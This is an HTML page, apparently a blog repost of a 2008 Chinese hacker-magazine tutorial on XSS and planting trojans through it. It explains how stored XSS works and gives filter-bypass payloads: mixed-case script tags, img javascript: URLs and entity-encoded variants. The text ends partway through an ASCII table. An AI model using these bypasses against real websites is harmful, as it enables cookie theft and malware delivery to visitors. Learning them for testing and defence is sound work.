@@ -1,0 +1,1398 @@
+<!DOCTYPE html>
+<html lang="zh-cn" itemscope itemtype="http://schema.org/WebPage">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>Cross-Site Scripting XSS 跨站攻击全攻略 - Nuclear&#39;Atk（核攻击）网络安全实验室</title>
+  
+
+<meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta name="MobileOptimized" content="width"/>
+<meta name="HandheldFriendly" content="true"/>
+
+
+<meta name="applicable-device" content="pc,mobile">
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+<meta name="mobile-web-app-capable" content="yes">
+
+<meta name="author" content="Nuclear&#39;Atk" /><meta name="description" content="题记：这是我在《黑客X档案》08年第5期发表的一篇文章，对跨站与挂马做了比较全面而深入的讲解。现在的黑客攻击手法中，跨站挂马似乎正在逐渐成为攻击的主流话题，鉴于这种形势，俺就把我学习跨站挂马的一点心得总结出来与大家分享。这篇文章由Nuclear&#39;Atk所写，并发表于Nuclear&#39;Atk个人博客。" />
+<meta name="keywords" content="Cross-Site,Scripting,XSS,跨站,挂马,攻击,全攻略,Nuclear&#39;Atk,Nuclear&#39;Atk 个人博客,Nuclear&#39;Atk 文章." />
+
+
+
+<meta name="baidu-site-verification" content="GSIJv096Bu" />
+
+
+
+<meta name="generator" content="Hugo 0.82.0" />
+
+
+<link rel="canonical" href="https://lcx.cc/post/1220/" />
+
+
+
+
+
+<link rel="icon" href="/favicon.ico" />
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/sass/jane.min.af20b78e95c84de86b00a0242a4a77bd2601700e1b250edf27537d957ac0041d.css" integrity="sha256-ryC3jpXITehrAKAkKkp3vSYBcA4bJQ7fJ1N9lXrABB0=" media="screen" crossorigin="anonymous">
+
+
+
+
+
+<meta property="og:title" content="Cross-Site Scripting XSS 跨站攻击全攻略" />
+<meta property="og:description" content="题记：这是我在《黑客X档案》08年第5期发表的一篇文章，对跨站与挂马做了比较全面而深入的讲解。现在的黑客攻击手法中，跨站挂马似乎正在逐渐成为攻击的主流话题，鉴于这种形势，俺就把我学习跨站挂马的一点心得总结出来与大家分享。这篇文章由Nuclear&#39;Atk所写，并发表于Nuclear&#39;Atk个人博客。" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://lcx.cc/post/1220/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2011-03-28T11:03:00&#43;08:00" />
+<meta property="article:modified_time" content="2011-03-28T11:03:00&#43;08:00" />
+
+<meta itemprop="name" content="Cross-Site Scripting XSS 跨站攻击全攻略">
+<meta itemprop="description" content="题记：这是我在《黑客X档案》08年第5期发表的一篇文章，对跨站与挂马做了比较全面而深入的讲解。现在的黑客攻击手法中，跨站挂马似乎正在逐渐成为攻击的主流话题，鉴于这种形势，俺就把我学习跨站挂马的一点心得总结出来与大家分享。这篇文章由Nuclear&#39;Atk所写，并发表于Nuclear&#39;Atk个人博客。"><meta itemprop="datePublished" content="2011-03-28T11:03:00&#43;08:00" />
+<meta itemprop="dateModified" content="2011-03-28T11:03:00&#43;08:00" />
+<meta itemprop="wordCount" content="7049">
+<meta itemprop="keywords" content="IP,XSS,攻击,跨站,Blog,CSS,EXP,Html,HTTP,IE,Java,URL,VB,VBS,Web,安全,测试,程序,代码,恶意,黑客,技术,脚本,浏览器,漏洞,论坛,绕过,事件,数据,网站,文件,问题,注入," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Cross-Site Scripting XSS 跨站攻击全攻略"/>
+<meta name="twitter:description" content="题记：这是我在《黑客X档案》08年第5期发表的一篇文章，对跨站与挂马做了比较全面而深入的讲解。现在的黑客攻击手法中，跨站挂马似乎正在逐渐成为攻击的主流话题，鉴于这种形势，俺就把我学习跨站挂马的一点心得总结出来与大家分享。这篇文章由Nuclear&#39;Atk所写，并发表于Nuclear&#39;Atk个人博客。"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+
+
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">Nuclear'Atk</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
+          
+        
+      </li>
+    
+
+    
+  </ul>
+</nav>
+
+
+  
+    
+
+
+
+
+
+
+  <link rel="stylesheet" href="/lib/photoswipe/photoswipe.min.css" />
+  <link rel="stylesheet" href="/lib/photoswipe/default-skin/default-skin.min.css" />
+
+
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+  
+
+  
+
+  
+
+  <header id="header" class="header container">
+    <div class="logo-wrapper">
+  <a href="/" class="logo">
+    
+      Nuclear'Atk
+    
+  </a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
+          
+
+        
+
+      </li>
+    
+
+    
+    
+
+    
+  </ul>
+</nav>
+
+  </header>
+
+  <div id="mobile-panel">
+    <main id="main" class="main bg-llight">
+      <div class="content-wrapper">
+        <div id="content" class="content container">
+          <article class="post bg-white">
+    
+    <header class="post-header">
+      <h1 class="post-title">Cross-Site Scripting XSS 跨站攻击全攻略</h1>
+      
+      <div class="post-meta">
+        <time datetime="2011-03-28" class="post-time">
+          2011-03-28
+        </time>
+        <div class="post-category">
+            <a href="https://lcx.cc/categories/%E8%80%81%E7%B3%BB%E7%BB%9F%E5%86%85%E5%AE%B9/"> 老系统内容 </a>
+            <a href="https://lcx.cc/categories/ip/"> IP </a>
+            <a href="https://lcx.cc/categories/xss/"> XSS </a>
+            <a href="https://lcx.cc/categories/%E6%94%BB%E5%87%BB/"> 攻击 </a>
+            <a href="https://lcx.cc/categories/%E8%B7%A8%E7%AB%99/"> 跨站 </a>
+            
+          </div>
+        <span class="more-meta"> 约 7049 字 </span>
+          <span class="more-meta"> 预计阅读 15 分钟 </span>
+
+        
+        
+
+        
+        
+      </div>
+    </header>
+
+    
+    
+<div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">文章目录</h2>
+  <div class="post-toc-content">
+    
+  </div>
+</div>
+
+    
+    <div class="post-content">
+      
+<P>&nbsp;&nbsp;&nbsp; 原文地址：<A href="http://a1pass.blog.163.com/blog/static/2971373220087295449497/" target=_blank>http://a1pass.blog.163.com/blog/static/2971373220087295449497/</A></P>
+<P style="TEXT-INDENT: 2em">现在的黑客攻击手法中，跨站挂马似乎正在逐渐成为攻击的主流话题，鉴于这种形势，俺就把我学习跨站挂马的一点心得总结出来与大家分享。</P>
+<P style="TEXT-INDENT: 2em">由于考虑到知识的认知过程以及入门朋友们的技术底子问题，本文将分为“基础知识”、“跨站漏洞”与“挂马技巧”三部分组成，咱们先来学习一下基础知识，以及跨站攻击的利用方法。</P>
+<P style="TEXT-INDENT: 2em">一、基础知识</P>
+<P style="TEXT-INDENT: 2em">1、什么是UBB码</P>
+<P style="TEXT-INDENT: 2em">XSS攻击主要在两种环境下进行，一个是用户自己构造的比标签，构造者汇总标签要严格遵循HTML标记语言，而UBB码是HTML的一个变种，属于系统提供的标签。UBB代码简单，功能很少，但是由于其TAG语法检查实现非常容易，所以许多网站引用了这种代码，以方便广大网友的使用，当然，同时也为我们打开了方便之门。</P>
+<P style="TEXT-INDENT: 2em">下面我列出几个例子，以便大家对UBB码有一个感性的认识。</P>
+<P style="TEXT-INDENT: 2em">显示为粗体效果：[B]文字[/B]</P>
+<P style="TEXT-INDENT: 2em">显示为斜体效果：[I]文字[/I]</P>
+<P style="TEXT-INDENT: 2em">显示文字的超链接：[URL= http://www.hackerxfiles.net/]黑客X档案官方站[/ URL]</P>
+<P style="TEXT-INDENT: 2em">通过上面的例子，我们可以看出来UBB码用的是中括号标签“[”与“]”。</P>
+<P style="TEXT-INDENT: 2em">为什么介绍这些？因为关键时候，我们借助UBB码也可以达到跨站的效果。</P>
+<P style="TEXT-INDENT: 2em">2、什么是HTML输入</P>
+<P style="TEXT-INDENT: 2em">大家看到这的时候，有条件的可以打开X档案的网站看看，我们在IE浏览器的页面中单击右键，选择“察看源文件（V）”选项，如图1。</P>
+<P style="TEXT-INDENT: 2em"><IMG title="跨站挂马全攻略 - A1Pass - A1Pass的风清月朗居" style="DISPLAY: block; FILTER: ; WIDTH: 335px; HEIGHT: 400px; TEXT-ALIGN: center" height=400 alt="跨站挂马全攻略 - A1Pass - A1Pass的风清月朗居" hspace=0 src="/file/old/809_cf6430114dd95846b8127b0a.jpg" width=335 border=0 __1301281400140__="ev_1453470298"></P>
+<P style="TEXT-INDENT: 2em">然后就会弹出如图2那样一个以首页文件命名的记事本。</P>
+<P style="TEXT-INDENT: 2em"><IMG title="跨站挂马全攻略 - A1Pass - A1Pass的风清月朗居" style="DISPLAY: block; FILTER: ; WIDTH: 480px; HEIGHT: 330px; TEXT-ALIGN: center" height=330 alt="跨站挂马全攻略 - A1Pass - A1Pass的风清月朗居" hspace=0 src="/file/old/810_6af514242dcbb6574d088d0b.jpg" width=480 border=0 __1301281400140__="ev_2643753096"></P>
+<P style="TEXT-INDENT: 2em">我们可以看见里面的代码都是用“&lt;”与“&gt;”括起来的，而这个“&lt;”与“&gt;”分别就是HTML的开始与结束标记。例如我们输入&lt;Script&gt;alert(“text”)&lt; /Script&gt;就是输入了一段HTML码，我们可以看见这段代码被“&lt;”与“&gt;”分成了两个标签，分别是&lt;Script&gt;与&lt; /Script &gt;，中间的则是这个标签需要解释的内容，关于这段HTML码的意义，我在下面会为大家解释清楚，大家不要急，更不要怕！</P>
+<P style="TEXT-INDENT: 2em">其实基础的跨站应用无非就是几个步骤的问题，要比SQL注入简单多了！在这篇文章中我争取从实用角度出发，从而让大家从啥都不懂，到能自主实战，但是前提是你仔细的读过本文。</P>
+<P style="TEXT-INDENT: 2em">&nbsp;</P>
+<P style="TEXT-INDENT: 2em">二、什么是跨站漏洞</P>
+<P style="TEXT-INDENT: 2em">所谓的跨站漏洞，就是一种往数据库里插入特定恶意代码的一种攻击技术，它被称为“XSS”或“CSS”，懂网页设计的朋友可能会困惑，CSS不是层叠式样式表的简称吗？没错，只不过是重名而已，因为跨站攻击的英文是Cross-Site Scripting，所以简称为CSS。但是为了与层叠式样式表区分，现在普遍叫做XSS。那么XSS为什么会被称作为跨站攻击呢？这是因为黑客通过别人的网站脚本漏洞达到攻击的效果，就是说可以隐藏攻击者的身份，因此叫做跨站攻击。其实“Cross-Site Scripting（跨站点脚本）”在意义上来讲是属于错误的名字，因为XSS攻击与脚本基本无关不说，甚至根本不一定是跨站点的。但是这在刚刚发现这种攻击手法时就起了这样一个名字，所以沿用至今，大家也就只能接受了。</P>
+<P style="TEXT-INDENT: 2em">对于受到XSS攻击的服务器来说，被插入恶意代码的WEB程序会永久的储存这些代码，除非人为的删掉它！当有人访问这个WEB程序下的某个页面时，恶意代码就会混杂在正常的代码中发送给浏览者，从而导致浏览器执行相应代码，因此达到黑客的攻击目的。</P>
+<P style="TEXT-INDENT: 2em">一般情况下来讲，人机交互比较高的WEB程序更容易受到XSS攻击，比如论坛、留言板与带有评论功能的新闻系统等等。而当黑客成功插入相关恶意代码时，那么他就可以挂马、获取管理员的登陆Cookie、强制执行操作甚至格式化浏览者的磁盘（不过用IE6.0的朋友不用担心硬盘被格式化，因为IE6.0的默认安全规则会阻止这些危险动作的发生）！只要是脚本能够实现的功能，跨站攻击同样能达到，因此XSS攻击的危害程度甚至与溢出攻击都是不相上下！</P>
+<P style="TEXT-INDENT: 2em">&nbsp;</P>
+<P style="TEXT-INDENT: 2em">三、跨站攻击的原理</P>
+<P style="TEXT-INDENT: 2em">其实， XSS攻击的本质还是注入的问题，只不过XSS攻击注入的是恶意的HTML脚本而已。但是这些注入的恶意代码为什么会被执行呢？这其实是由于浏览器的不足造成的。</P>
+<P style="TEXT-INDENT: 2em">因为浏览器在接受数据时，他无法辨认哪些是应该解释的代码，哪些是不需要解释的数据。如果是数据，浏览器完全可以简单的将其显示出来即可，但可悲的是浏览器做不到这点，只要碰到符合条件的标记，他就会将其解释执行，从而给我们XSS攻击埋下伏笔。</P>
+<P style="TEXT-INDENT: 2em">所以如果WEB程序在接受数据时如果不做有效的过滤，就会导致恶意代码进入数据库，而且我们注入的JavaS<WBR>cript代码可以在安全策略准许的范围内执行任何操作，如果这段JavaS<WBR>cript代码可以让对方的电脑下载并执行你的木马时，这就是我们所说的“挂马”了。</P>
+<P style="TEXT-INDENT: 2em">归根结底，跨站攻击的根本漏洞就在WEB程序里，大家可以看看图3。</P>
+<P style="TEXT-INDENT: 2em"><IMG title="跨站挂马全攻略 - A1Pass - A1Pass的风清月朗居" style="DISPLAY: block; FILTER: ; WIDTH: 480px; HEIGHT: 236px; TEXT-ALIGN: center" height=236 alt="跨站挂马全攻略 - A1Pass - A1Pass的风清月朗居" hspace=0 src="/file/old/811_ede78f0eb5a1c89c7acbe10b.jpg" width=480 border=0 __1301281400140__="ev_7476598562"></P>
+<P style="TEXT-INDENT: 2em">有助于你进一步理解XSS攻击的含义，我们通过图3可以看出来，如果WEB程序能做跟好的滤，XSS攻击是完全有可能被避免的。</P>
+<P style="TEXT-INDENT: 2em">&nbsp;</P>
+<P style="TEXT-INDENT: 2em">&nbsp;</P>
+<P style="TEXT-INDENT: 2em">四、跨站攻击的挖掘</P>
+<P style="TEXT-INDENT: 2em">知道了XSS攻击的之后，我们怎样才能挖掘网站的XSS漏洞呢？</P>
+<P style="TEXT-INDENT: 2em">想挖掘网站的XSS漏洞，我们必须要有基本的脚本底子，鉴于我们叉子的电脑基础问题，这里我就先为大家解释一下标准测试代码&lt;Script&gt;alert(“text”)&lt; /Script&gt;的意思，要注意看哦！其中的text可以改为任何字，如果存在XSS漏洞，我们使用这段代码进行XSS攻击后，浏览相的应页面就会弹出包含text这个字符的提示框，如图4。</P>
+<P style="TEXT-INDENT: 2em"><IMG title="跨站挂马全攻略 - A1Pass - A1Pass的风清月朗居" style="DISPLAY: block; FILTER: ; WIDTH: 258px; HEIGHT: 121px; TEXT-ALIGN: center" height=121 alt="跨站挂马全攻略 - A1Pass - A1Pass的风清月朗居" hspace=0 src="/file/old/812_03ccb63643fd318ba2cc2b0b.jpg" width=258 border=0 __1301281400140__="ev_5618398034"></P>
+<P style="TEXT-INDENT: 2em">而&lt;Script&gt;与&lt; /Script &gt;则分别是脚本开始、结束的HTML标记，alert是JavaS<WBR>cript下的一个显示信息对话框的方法，这个大家知道就行。也就是说，如果跨站成功，这个alert方法就会被执行。因此，我们就可以将alert换成任意的JavaS<WBR>cript代码，那么实现挂马功能自然也就不在话下了。</P>
+<P style="TEXT-INDENT: 2em">鉴于XSS攻击的危害性，一般的站点都会将&lt;Script&gt;与&lt; /Script &gt;这样敏感的关键字过滤，那该怎么办？难道我们一开始就被难住了吗？ON！我们当然不能被他们难住，肯定有办法突破的！</P>
+<P style="TEXT-INDENT: 2em">但是突破了这个限制，如果碰到别的限制怎么办呢？不要急，今天我就带领大家步步设防，在步步突破！从不断的突破中带领大家学习XSS攻击的大体思路！</P>
+<P style="TEXT-INDENT: 2em">那么面对我们的第一道关于&lt;Script&gt;与&lt; /Script &gt;的过滤我们该怎么办呢？</P>
+<P style="TEXT-INDENT: 2em">第一步就是看看替换大小写！这替换大小写真可谓万能招数啊……</P>
+<P style="TEXT-INDENT: 2em">我们只需将&lt;Script&gt;与&lt; /Script &gt;改为&lt;ScRipT&gt;与&lt; /SCrIPt &gt;或类似的形式即可。如果没通过怎么办？看看下面这个办法。</P>
+<P style="TEXT-INDENT: 2em">对于过滤&lt;Script&gt;与&lt; /Script &gt;来说，我们使用HTML标签下就可以绕过，例如：</P>
+<P style="TEXT-INDENT: 2em">&lt;img src=javas<WBR>cript:alert(“text-img”) &gt;&lt;/img&gt;</P>
+<P style="TEXT-INDENT: 2em">它执行后与&lt;Script&gt;alert(“text”)&lt; /Script&gt;结果是一样的，如图5。</P>
+<P style="TEXT-INDENT: 2em"><IMG title="跨站挂马全攻略 - A1Pass - A1Pass的风清月朗居" style="DISPLAY: block; FILTER: ; WIDTH: 258px; HEIGHT: 121px; TEXT-ALIGN: center" height=121 alt="跨站挂马全攻略 - A1Pass - A1Pass的风清月朗居" hspace=0 src="/file/old/813_da940edebfdc930295ee370b.jpg" width=258 border=0 __1301281400140__="ev_2770715116"></P>
+<P style="TEXT-INDENT: 2em">通过对比，我们可以知道被执行的是“ alert(“text-img”) ”这段JavaS<WBR>cript代码，而执行JavaS<WBR>cript的标记则变成了“ javas<WBR>cript: ”，这段XSS攻击代码巧妙的利用了&lt;img&gt;标签提供的“&lt;&gt;”号执行了相应的JavaS<WBR>cript代码。</P>
+<P style="TEXT-INDENT: 2em">那么，如果我们javas<WBR>cript:也被过滤了的话，那该怎么办呢？呵呵，我们还可以试试部分字符换作ASCII码表示是否可以。对于过滤javas<WBR>cript:来说，我们就将javas<WBR>cript:中的某些字符转换为16进制的值，例如：&lt;img src=”&amp;#106avascript&amp;#58aler(/src-text/) “&gt;，其中的&amp;#106与&amp;#106就是“j”与“:”的16进制。当然我们转换成&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41&gt;效果更好些！除此之外，我们还可以将j由&amp;#106;转换成例如&amp;#0000106;也可以。</P>
+<P style="TEXT-INDENT: 2em">具体转换内容大家可以参考ASCII码表：</P>
+<TABLE cellSpacing=0 cellPadding=0 width="90%" align=center border=1>
+<TBODY>
+<TR>
+<TH width="10%"><FONT face=Simsun>八进制</FONT></TH>
+<TH width="11%"><FONT face=Simsun>十六进制</FONT></TH>
+<TH width="13%"><FONT face=Simsun>十进制</FONT></TH>
+<TH width="8%"><FONT face=Simsun>字符</FONT></TH>
+<TH width="13%"><FONT face=Simsun>八进制</FONT></TH>
+<TH width="17%"><FONT face=Simsun>十六进制</FONT></TH>
+<TH width="13%"><FONT face=Simsun>十进制</FONT></TH>
+<TH width="15%"><FONT face=Simsun>字符</FONT></TH></TR>
+<TR>
+<TD><FONT class=font face=Simsun>00</FONT></TD>
+<TD><FONT class=font face=Simsun>00</FONT></TD>
+<TD><FONT class=font face=Simsun>0</FONT></TD>
+<TD><FONT class=font face=Simsun>nul</FONT></TD>
+<TD><FONT class=font face=Simsun>100</FONT></TD>
+<TD><FONT class=font face=Simsun>40</FONT></TD>
+<TD><FONT class=font face=Simsun>64</FONT></TD>
+<TD><FONT class=font face=Simsun>@</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>01</FONT></TD>
+<TD><FONT class=font face=Simsun>01</FONT></TD>
+<TD><FONT class=font face=Simsun>1</FONT></TD>
+<TD><FONT class=font face=Simsun>soh</FONT></TD>
+<TD><FONT class=font face=Simsun>101</FONT></TD>
+<TD><FONT class=font face=Simsun>41</FONT></TD>
+<TD><FONT class=font face=Simsun>65</FONT></TD>
+<TD><FONT class=font face=Simsun>A</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>02</FONT></TD>
+<TD><FONT class=font face=Simsun>02</FONT></TD>
+<TD><FONT class=font face=Simsun>2</FONT></TD>
+<TD><FONT class=font face=Simsun>stx</FONT></TD>
+<TD><FONT class=font face=Simsun>102</FONT></TD>
+<TD><FONT class=font face=Simsun>42</FONT></TD>
+<TD><FONT class=font face=Simsun>66</FONT></TD>
+<TD><FONT class=font face=Simsun>B</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>03</FONT></TD>
+<TD><FONT class=font face=Simsun>03</FONT></TD>
+<TD><FONT class=font face=Simsun>3</FONT></TD>
+<TD><FONT class=font face=Simsun>etx</FONT></TD>
+<TD><FONT class=font face=Simsun>103</FONT></TD>
+<TD><FONT class=font face=Simsun>43</FONT></TD>
+<TD><FONT class=font face=Simsun>67</FONT></TD>
+<TD><FONT class=font face=Simsun>C</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>04</FONT></TD>
+<TD><FONT class=font face=Simsun>04</FONT></TD>
+<TD><FONT class=font face=Simsun>4</FONT></TD>
+<TD><FONT class=font face=Simsun>eot</FONT></TD>
+<TD><FONT class=font face=Simsun>104</FONT></TD>
+<TD><FONT class=font face=Simsun>44</FONT></TD>
+<TD><FONT class=font face=Simsun>68</FONT></TD>
+<TD><FONT class=font face=Simsun>D</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>05</FONT></TD>
+<TD><FONT class=font face=Simsun>05</FONT></TD>
+<TD><FONT class=font face=Simsun>5</FONT></TD>
+<TD><FONT class=font face=Simsun>enq</FONT></TD>
+<TD><FONT class=font face=Simsun>105</FONT></TD>
+<TD><FONT class=font face=Simsun>45</FONT></TD>
+<TD><FONT class=font face=Simsun>69</FONT></TD>
+<TD><FONT class=font face=Simsun>E</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>06</FONT></TD>
+<TD><FONT class=font face=Simsun>06</FONT></TD>
+<TD><FONT class=font face=Simsun>6</FONT></TD>
+<TD><FONT class=font face=Simsun>ack</FONT></TD>
+<TD><FONT class=font face=Simsun>106</FONT></TD>
+<TD><FONT class=font face=Simsun>46</FONT></TD>
+<TD><FONT class=font face=Simsun>70</FONT></TD>
+<TD><FONT class=font face=Simsun>F</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>07</FONT></TD>
+<TD><FONT class=font face=Simsun>07</FONT></TD>
+<TD><FONT class=font face=Simsun>7</FONT></TD>
+<TD><FONT class=font face=Simsun>bel</FONT></TD>
+<TD><FONT class=font face=Simsun>107</FONT></TD>
+<TD><FONT class=font face=Simsun>47</FONT></TD>
+<TD><FONT class=font face=Simsun>71</FONT></TD>
+<TD><FONT class=font face=Simsun>G</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>10</FONT></TD>
+<TD><FONT class=font face=Simsun>08</FONT></TD>
+<TD><FONT class=font face=Simsun>8</FONT></TD>
+<TD><FONT class=font face=Simsun>bs</FONT></TD>
+<TD><FONT class=font face=Simsun>110</FONT></TD>
+<TD><FONT class=font face=Simsun>48</FONT></TD>
+<TD><FONT class=font face=Simsun>72</FONT></TD>
+<TD><FONT class=font face=Simsun>H</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>11</FONT></TD>
+<TD><FONT class=font face=Simsun>09</FONT></TD>
+<TD><FONT class=font face=Simsun>9</FONT></TD>
+<TD><FONT class=font face=Simsun>ht</FONT></TD>
+<TD><FONT class=font face=Simsun>111</FONT></TD>
+<TD><FONT class=font face=Simsun>49</FONT></TD>
+<TD><FONT class=font face=Simsun>73</FONT></TD>
+<TD><FONT class=font face=Simsun>I</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>12</FONT></TD>
+<TD><FONT class=font face=Simsun>0a</FONT></TD>
+<TD><FONT class=font face=Simsun>10</FONT></TD>
+<TD><FONT class=font face=Simsun>nl</FONT></TD>
+<TD><FONT class=font face=Simsun>112</FONT></TD>
+<TD><FONT class=font face=Simsun>4a</FONT></TD>
+<TD><FONT class=font face=Simsun>74</FONT></TD>
+<TD><FONT class=font face=Simsun>J</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>13</FONT></TD>
+<TD><FONT class=font face=Simsun>0b</FONT></TD>
+<TD><FONT class=font face=Simsun>11</FONT></TD>
+<TD><FONT class=font face=Simsun>vt</FONT></TD>
+<TD><FONT class=font face=Simsun>113</FONT></TD>
+<TD><FONT class=font face=Simsun>4b</FONT></TD>
+<TD><FONT class=font face=Simsun>75</FONT></TD>
+<TD><FONT class=font face=Simsun>K</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>14</FONT></TD>
+<TD><FONT class=font face=Simsun>0c</FONT></TD>
+<TD><FONT class=font face=Simsun>12</FONT></TD>
+<TD><FONT class=font face=Simsun>ff</FONT></TD>
+<TD><FONT class=font face=Simsun>114</FONT></TD>
+<TD><FONT class=font face=Simsun>4c</FONT></TD>
+<TD><FONT class=font face=Simsun>76</FONT></TD>
+<TD><FONT class=font face=Simsun>L</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>15</FONT></TD>
+<TD><FONT class=font face=Simsun>0d</FONT></TD>
+<TD><FONT class=font face=Simsun>13</FONT></TD>
+<TD><FONT class=font face=Simsun>er</FONT></TD>
+<TD><FONT class=font face=Simsun>115</FONT></TD>
+<TD><FONT class=font face=Simsun>4d</FONT></TD>
+<TD><FONT class=font face=Simsun>77</FONT></TD>
+<TD><FONT class=font face=Simsun>M</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>16</FONT></TD>
+<TD><FONT class=font face=Simsun>0e</FONT></TD>
+<TD><FONT class=font face=Simsun>14</FONT></TD>
+<TD><FONT class=font face=Simsun>so</FONT></TD>
+<TD><FONT class=font face=Simsun>116</FONT></TD>
+<TD><FONT class=font face=Simsun>4e</FONT></TD>
+<TD><FONT class=font face=Simsun>78</FONT></TD>
+<TD><FONT class=font face=Simsun>N</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>17</FONT></TD>
+<TD><FONT class=font face=Simsun>0f</FONT></TD>
+<TD><FONT class=font face=Simsun>15</FONT></TD>
+<TD><FONT class=font face=Simsun>si</FONT></TD>
+<TD><FONT class=font face=Simsun>117</FONT></TD>
+<TD><FONT class=font face=Simsun>4f</FONT></TD>
+<TD><FONT class=font face=Simsun>79</FONT></TD>
+<TD><FONT class=font face=Simsun>O</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>20</FONT></TD>
+<TD><FONT class=font face=Simsun>10</FONT></TD>
+<TD><FONT class=font face=Simsun>16</FONT></TD>
+<TD><FONT class=font face=Simsun>dle</FONT></TD>
+<TD><FONT class=font face=Simsun>120</FONT></TD>
+<TD><FONT class=font face=Simsun>50</FONT></TD>
+<TD><FONT class=font face=Simsun>80</FONT></TD>
